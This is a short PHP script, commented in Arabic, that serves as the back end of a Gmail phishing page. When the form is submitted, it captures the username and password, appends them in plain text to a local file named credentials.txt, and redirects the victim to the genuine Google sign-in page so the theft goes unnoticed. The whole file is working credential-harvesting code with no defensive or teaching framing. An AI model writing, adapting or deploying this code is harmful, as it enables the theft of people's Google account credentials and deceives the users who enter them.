<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // اسم الملف الذي سيتم تخزين البيانات فيه
    $file = 'credentials.txt';

    // تنسيق البيانات المراد حفظها
    $data = "Username: " . $username . "\nPassword: " . $password . "\n\n";

    // فتح الملف والكتابة فيه، مع وضع البيانات في سطر جديد
    // FILE_APPEND يضمن عدم مسح المحتوى القديم
    file_put_contents($file, $data, FILE_APPEND);

    // إعادة توجيه المستخدم إلى الصفحة الحقيقية لـ Gmail
    header('Location: https://accounts.google.com/v3/signin/identifier?hl=ar&ifkv=Af_xna94i8-hKk8uV-1p0jP4F2T3J8V2M5W1z8R0Q4L5Z7C9B0X5S7Y2P6K4H2D1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&continue=https%3A%2F%2Fwww.google.com');
    exit();
}

?>
